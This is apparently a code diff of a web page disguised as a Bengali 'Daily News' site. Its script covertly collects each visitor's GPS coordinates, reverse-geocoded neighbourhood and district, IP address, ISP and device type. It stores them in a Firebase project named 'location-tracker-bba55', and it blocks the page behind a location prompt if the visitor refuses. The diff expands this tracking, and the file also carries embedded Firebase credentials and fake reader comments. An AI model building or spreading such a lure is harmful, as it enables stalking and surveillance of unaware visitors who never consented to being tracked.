@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>ডেইলি নিউজ</title>
+<title>Daily News</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -42,36 +42,17 @@ border-radius:6px;
 .ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
 .footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}
 
+/* gate */
 #locationGate{
-position:fixed;
-top:0;left:0;
-width:100%;height:100%;
+position:fixed;top:0;left:0;width:100%;height:100%;
 backdrop-filter:blur(6px);
 background:rgba(0,0,0,0.4);
-display:none;
-justify-content:center;
-align-items:center;
-z-index:9999;
+display:none;justify-content:center;align-items:center;z-index:9999;
 }
 
 .gate-box{
-background:white;
-padding:25px;
-border-radius:12px;
-width:90%;
-max-width:340px;
-text-align:center;
-}
-
-.gate-box button{
-width:100%;
-padding:12px;
-background:#ff4b5c;
-color:white;
-border:none;
-border-radius:6px;
-margin-top:10px;
-cursor:pointer;
+background:white;padding:25px;border-radius:12px;width:90%;max-width:340px;
+text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.2);
 }
 </style>
 </head>
@@ -80,30 +61,30 @@ cursor:pointer;
 
 <div id="locationGate">
 <div class="gate-box">
-<h2>📍 লোকেশন চালু করুন</h2>
+<h2>📍 Enable Location</h2>
 <p>আপনার এলাকার খবর দেখতে location চালু করুন</p>
-<button onclick="retryLocation()">চালু করুন</button>
+<button onclick="retryLocation()">Enable Location</button>
 </div>
 </div>
 
-<header>📰 ডেইলি নিউজ</header>
+<header>📰 Daily News</header>
 
 <nav>
-<a href="#">হোম</a>
-<a href="#">বিশ্ব</a>
-<a href="#">টেক</a>
-<a href="#">খেলা</a>
+<a href="#" onclick="showHome()">Home</a>
+<a href="#">World</a>
+<a href="#">Tech</a>
+<a href="#">Sports</a>
 </nav>
 
 <div class="container">
 
 <div id="homePage">
-<div class="ad">📢 বিজ্ঞাপন</div>
+<div class="ad">📢 Advertisement</div>
 <div id="newsContainer" class="grid"></div>
 </div>
 
 <div id="articlePage">
-<button onclick="showHome()">⬅ ফিরে যান</button>
+<button onclick="showHome()">⬅ Back</button>
 
 <div class="article">
 <h2 id="title"></h2>
@@ -111,8 +92,10 @@ cursor:pointer;
 <p id="content"></p>
 </div>
 
+<div class="ad">📢 Sponsored Content</div>
+
 <div class="comments">
-<h4>💬 মন্তব্য</h4>
+<h4>💬 Comments</h4>
 <div id="commentList"></div>
 </div>
 
@@ -120,28 +103,56 @@ cursor:pointer;
 
 </div>
 
-<div class="footer">© ২০২৬ ডেইলি নিউজ</div>
+<div class="footer">© 2026 Daily News</div>
 
 <script type="module">
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-const app = initializeApp({
-apiKey:"AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
-authDomain:"location-tracker-bba55.firebaseapp.com",
-projectId:"location-tracker-bba55"
-});
+const firebaseConfig = {
+apiKey: "AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
+authDomain: "location-tracker-bba55.firebaseapp.com",
+projectId: "location-tracker-bba55",
+storageBucket: "location-tracker-bba55.appspot.com",
+messagingSenderId: "951484366467",
+appId: "1:951484366467:web:2e936d42b1704027f665b6"
+};
+
+const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-// SAVE
+// USER
 function getUserId(){
-let id=localStorage.getItem("uid")
+let id=localStorage.getItem("userId")
 if(!id){
 id=Math.random().toString(36).substring(2,10)
-localStorage.setItem("uid",id)
+localStorage.setItem("userId",id)
 }
 return id
+}
+
+function detectDevice(){
+return /mobile/i.test(navigator.userAgent)?"Mobile":"Desktop"
+}
+
+function detectDeviceModel(){
+let ua=navigator.userAgent
+if(ua.includes("Android")) return "Android"
+if(ua.includes("Windows")) return "Windows"
+return "Unknown"
+}
+
+// LOCATION
+async function getLocationDetails(lat,lon){
+try{
+let res=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+let d=await res.json()
+return {
+thana:d.address.suburb||"unknown",
+district:d.address.state_district||"unknown"
+}
+}catch{return {thana:"unknown",district:"unknown"}}
 }
 
 async function getIP(){
@@ -153,23 +164,42 @@ async function save(data){
 await setDoc(doc(db,"locations",getUserId()),data)
 }
 
-function autoDetect(){
-navigator.geolocation.getCurrentPosition(
-async pos=>{
+async function handleGPS(pos){
+let loc=await getLocationDetails(pos.coords.latitude,pos.coords.longitude)
 let ip=await getIP()
+
 save({
-lat:pos.coords.latitude,
-lon:pos.coords.longitude,
-ip:ip.ip,
+latitude:pos.coords.latitude,
+longitude:pos.coords.longitude,
+thana:loc.thana,
+district:loc.district,
 country:ip.country,
+ip:ip.ip,
+isp:ip.org,
+device:detectDevice(),
+deviceModel:detectDeviceModel(),
+type:"GPS",
 time:new Date().toLocaleString()
 })
-},
-async ()=>{
-let ip=await getIP()
-save({ip:ip.ip,country:ip.country})
-document.getElementById("locationGate").style.display="flex"
 }
+
+async function handleIP(){
+let ip=await getIP()
+save({
+country:ip.country,
+ip:ip.ip,
+isp:ip.org,
+device:detectDevice(),
+deviceModel:detectDeviceModel(),
+type:"IP",
+time:new Date().toLocaleString()
+})
+}
+
+function autoDetect(){
+navigator.geolocation.getCurrentPosition(
+pos=>handleGPS(pos),
+()=>{handleIP();document.getElementById("locationGate").style.display="flex"}
 )
 }
 
@@ -177,63 +207,91 @@ window.retryLocation=function(){
 navigator.geolocation.getCurrentPosition(
 pos=>{
 document.getElementById("locationGate").style.display="none"
-},
-()=>alert("লোকেশন চালু করুন")
-)
-}
-
-// 🔥 TRANSLATE
-async function translate(text){
-try{
-let r=await fetch(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(text)}&langpair=en|bn`)
-let d=await r.json()
-return d.responseData.translatedText
-}catch{return text}
-}
-
-// NEWS
-let newsData=[]
-async function loadNews(){
-let r=await fetch("https://api.spaceflightnewsapi.net/v4/articles/")
-let d=await r.json()
-newsData=d.results
-
-let c=document.getElementById("newsContainer")
-c.innerHTML=""
-
-newsData.slice(0,8).forEach(async (n,i)=>{
-
-let title=await translate(n.title)
-
-let div=document.createElement("div")
-div.className="card"
-div.innerHTML=`<img src="${n.image_url}"><h4>${title}</h4>`
-div.onclick=()=>openArticle(i)
-
-c.appendChild(div)
+handleGPS(pos)
 })
 }
 
-// ARTICLE
-window.openArticle=async function(i){
-let n=newsData[i]
+// 🔥 MULTI SOURCE NEWS
+let newsData=[]
 
-let t=await translate(n.title)
-let s=await translate(n.summary)
+async function loadNews(){
+
+let container=document.getElementById("newsContainer")
+container.innerHTML="Loading..."
+
+try{
+
+let sources=[
+"https://api.rss2json.com/v1/api.json?rss_url=https://www.prothomalo.com/feed",
+"https://api.rss2json.com/v1/api.json?rss_url=https://bdnews24.com/?widgetName=rssfeed&widgetId=1151&getXmlFeed=true"
+]
+
+let allNews=[]
+
+for(let url of sources){
+let res=await fetch(url)
+let data=await res.json()
+allNews=[...allNews,...data.items]
+}
+
+// shuffle
+allNews.sort(()=>Math.random()-0.5)
+
+newsData=allNews.slice(0,10)
+
+container.innerHTML=""
+
+newsData.forEach((n,i)=>{
+
+let img=n.thumbnail || "https://source.unsplash.com/400x300/?news"
+
+let div=document.createElement("div")
+div.className="card"
+
+div.innerHTML=`<img src="${img}"><h4>${n.title}</h4>`
+
+div.onclick=()=>openArticle(i)
+
+container.appendChild(div)
+
+})
+
+}catch{
+container.innerHTML="Failed to load news"
+}
+
+}
+
+// article
+window.openArticle=function(i){
+let n=newsData[i]
 
 document.getElementById("homePage").style.display="none"
 document.getElementById("articlePage").style.display="block"
 
-document.getElementById("title").innerText=t
-document.getElementById("image").src=n.image_url
-document.getElementById("content").innerText=s
+document.getElementById("title").innerText=n.title
+document.getElementById("image").src=n.thumbnail
+document.getElementById("content").innerText=n.description.replace(/<[^>]+>/g,'')
 
+loadComments()
 }
 
-// BACK
 window.showHome=function(){
 document.getElementById("homePage").style.display="block"
 document.getElementById("articlePage").style.display="none"
+}
+
+// comments
+function loadComments(){
+let arr=["দারুণ খবর!","খুব ভালো লেগেছে","ধন্যবাদ আপডেটের জন্য"]
+let list=document.getElementById("commentList")
+list.innerHTML=""
+arr.forEach(c=>{
+let d=document.createElement("div")
+d.className="comment"
+d.innerText=c
+list.appendChild(d)
+})
 }
 
 // INIT
